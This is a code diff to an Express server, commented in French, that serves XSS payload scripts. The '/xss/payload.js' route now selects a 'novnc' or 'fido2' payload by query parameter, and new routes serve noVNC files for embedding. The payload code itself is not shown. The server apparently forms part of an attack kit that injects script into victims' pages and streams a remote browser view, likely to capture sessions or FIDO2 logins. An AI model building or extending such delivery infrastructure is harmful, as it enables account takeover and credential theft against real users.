@@ -260,7 +260,15 @@ app.post('/postScreenSize', async (req, res) => {
 app.get('/xss/payload.js', (req, res) => {
     log('INFO', 'GET /xss/payload.js - Serving XSS payload');
     
-    const payloadPath = path.join(__dirname, '../../frontend/payload/payload.js');
+    // Déterminer quel payload envoyer
+    const payloadType = req.query.type || 'novnc'; // 'novnc' ou 'fido2'
+    
+    let payloadPath;
+    if (payloadType === 'novnc') {
+        payloadPath = path.join(__dirname, '../../frontend/payload/payload-novnc.js');
+    } else {
+        payloadPath = path.join(__dirname, '../../frontend/payload/payload.js');
+    }
     
     if (fs.existsSync(payloadPath)) {
         res.type('application/javascript');
@@ -291,6 +299,16 @@ app.post('/navigate', async (req, res) => {
         res.status(500).json({ error: error.message });
     }
 });
+
+// Servir noVNC statique
+const express_static = require('express');
+app.use('/novnc', express_static(path.join(__dirname, '../../noVNC')));
+
+// Route pour vnc_lite.html (version embedable)
+app.get('/vnc_lite.html', (req, res) => {
+    res.sendFile(path.join(__dirname, '../../noVNC/vnc_lite.html'));
+});
+
 
 // ==================== DÉMARRAGE ====================
 
